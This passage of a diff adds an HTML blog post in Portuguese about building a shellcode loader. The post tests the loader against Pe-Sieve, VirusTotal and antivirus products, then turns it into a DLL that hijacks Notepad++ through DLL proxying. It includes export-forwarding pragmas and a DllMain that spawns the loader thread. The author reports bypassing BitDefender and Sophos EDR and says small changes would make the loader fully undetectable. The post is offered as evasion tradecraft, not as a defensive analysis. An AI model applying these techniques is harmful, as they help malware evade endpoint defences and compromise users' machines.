+                style="color: #9E2525;">ntdll.dll</span>.</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Pe-Sieve</h2>
+            <p>Bom, não quis me aprofundar muito no código, pois se você viu os posts anteriores, já entende
+              praticamente tudo o que estou fazendo. Mas de qualquer maneira, vamos realizar alguns testes nele.
+              Primeiro vamos ver como ele se sai contra o <a href="https://github.com/hasherezade/pe-sieve"
+                href="https://github.com/hasherezade/pe-sieve" style="color: #9E2525;">Pe-Sieve</a>:</p>
+            <br>
+            <p><img src="https://telegra.ph/file/9576603eb0734df230c2b.gif" alt="pe-sieve"
+                style="max-width: 100%; height: 510px; width: 880px; display: block; margin: 20px auto;"></p>
+            <br>
+            <p>Como podemos ver, o <span style="color: #9E2525;">Pe-Sieve</span> não encontra nenhuma shellcode no
+              processo.</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">VirusTotal</h2>
+            <br>
+            <p><img src="https://telegra.ph/file/9a984d9ebce7301704269.gif" alt="VirusTotal"
+                style="max-width: 100%; height: 510px; width: 880px; display: block; margin: 20px auto;"></p>
+            <br>
+            <p>Temos apenas 1 detecção no VirusTotal por conta do <a href="https://github.com/kernelwernel/VMAware/"
+                href="https://github.com/kernelwernel/VMAware/" style="color: #9E2525;">VMAware</a>, Não vejo isso como
+              um problema. Vamos seguir em frente.</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Contra antivírus
+            </h2>
+            <p>Fiz um teste do loader contra os seguintes antivírus: <span style="color: #9E2525;">Avast, MalwareBytes,
+                McAfee, Kaspersky e BitDefender</span>. Dentre esses 5, apenas 1 detectou o loader, que foi o <span
+                style="color: #9E2525;">BitDefender</span>.</p>
+            <br>
+            <div align="center">
+              <iframe width="980" height="615" src="https://www.youtube.com/embed/BOUuM60hIXI" frameborder="0"
+                allowfullscreen></iframe>
+            </div>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Contornando o
+              BitDefender</h2>
+            <p>Como o <span style="color: #9E2525;">BitDefender</span> acabou detectando o loader, vamos apenas
+              modificar um pouco ele. Vamos transformá-lo em uma DLL e realizar uma técnica de DLL proxy no <span
+                style="color: #9E2525;">Notepad++</span>, isso já foi abordado no meu post <a
+                href="malware-analysis-2.html" href="malware-analysis-2.html"
+                style="color: #9E2525;">Malware-Analysis-2</a>. Abaixo está o que será necessário adicionar.</p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> <span class="hljs-keyword">warning</span>(disable : 4996)</span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:beNotified=original.beNotified,@1&quot;</span>)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:getFuncsArray=original.getFuncsArray,@2&quot;</span>)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:getName=original.getName,@3&quot;</span>)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:isUnicode=original.isUnicode,@4&quot;</span>)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:messageProc=original.messageProc,@5&quot;</span>)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:setInfo=original.setInfo,@6&quot;</span>)</span>
+</pre>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">DoMagic</span><span class="hljs-params">(LPVOID lpParameter)</span>
+</span>{
+    <span class="hljs-built_in">main</span>();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+
+<span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,
+    DWORD ul_reason_for_call,
+    LPVOID lpReserved
+)</span>
+</span>{
+    HANDLE threadHandle;
+
+    <span class="hljs-keyword">switch</span> (ul_reason_for_call)
+    {
+    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
+
+        threadHandle = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, DoMagic, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+        <span class="hljs-built_in">CloseHandle</span>(threadHandle);
+        <span class="hljs-keyword">break</span>;
+
+    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:
+        <span class="hljs-keyword">break</span>;
+    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:
+        <span class="hljs-keyword">break</span>;
+    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
+        <span class="hljs-keyword">break</span>;
+    }
+
+    <span class="hljs-keyword">return</span> TRUE;
+}
+</pre>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Resultado</h2>
+            <p>Bom, como eu já esperava, não foi detectado e conseguimos também contornar com sucesso o <span
+                style="color: #9E2525;">BitDefender</span>.</p>
+            <br>
+            <p><img src="https://telegra.ph/file/08dcd21d5f28e63acde85.gif" alt="BitDefender"
+                style="max-width: 100%; height: 510px; width: 880px; display: block; margin: 20px auto;"></p>
+            <br>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">VirusTotal</h3>
+            <p>O resultado do loader em DLL contra o <span style="color: #9E2525;">VirusTotal</span> é baixo apenas 2
+              detecções. Caso quiséssemos torná-lo 100% indetectável, precisaríamos apenas fazer algumas pequenas
+              modificações, nada que causaria dor de cabeça.</p>
+            <br>
+            <p><img src="https://telegra.ph/file/d6d55cd067feab250a5af.gif" alt="VirusTotal"
+                style="max-width: 100%; height: 510px; width: 880px; display: block; margin: 20px auto;"></p>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Sophos EDR</h2>
+            <p>Conseguimos contornar também o <a href="https://www.sophos.com/pt-br/products/endpoint-antivirus/edr"
+                href="https://www.sophos.com/pt-br/products/endpoint-antivirus/edr" style="color: #9E2525;">Sophos
+                EDR</a> nos dois formatos Dll,EXE.</p>
+            <br>
+            <div align="center">
+              <iframe width="980" height="615" src="https://www.youtube.com/embed/OP-6RooHQ0o" frameborder="0"
+                allowfullscreen></iframe>
+            </div>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Conclusões</h2>
+            <br>
+            <p><img
+                src="https://media0.giphy.com/media/14ceV8wMLIGO6Q/giphy.gif?cid=7941fdc6g8l53q9d6vojfo9v7edj9ldzp5p4qmmxjv2evzaa&ep=v1_gifs_search&rid=giphy.gif&ct=g"
+                alt="Boom" style="max-width: 100%; height: 420; width: 720px; display: block; margin: 20px auto;"></p>
+            <br>
+            <p>Bom, conseguimos finalmente contornar um EDR e também alguns antivírus básicos e não ter uma taxa de
+              detecção tão alta no VirusTotal. Obviamente, há muito espaço para melhorar o código. Mas tudo bem, meu
+              intuito não é criar algo muito complexo, e sim apenas fazer um loader simples de entender e que no final
+              funcione. Se você chegou até aqui, obrigado e tchau tchau.</p>
+          </div>
+        </article>
+      </div>
+    </main>
+    <footer style="background-color: rgba(27, 27, 27, 0.7); text-align: center; padding: 5px 0;">
+      <h6 style="color: rgba(255, 255, 255, 0.4) !important;">Copyright © Vithor 2023/2024</h6>
+    </footer>
+    <script>
+      function isMobileDevice() {
+        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent);
+      }
+
+      if (isMobileDevice()) {
+        alert("Este site não é compatível com dispositivos móveis. Você será redirecionado para o Google.");
+        window.location.href = "https://www.google.com";
+      }
+    </script>
+  </body>
+
+</html>
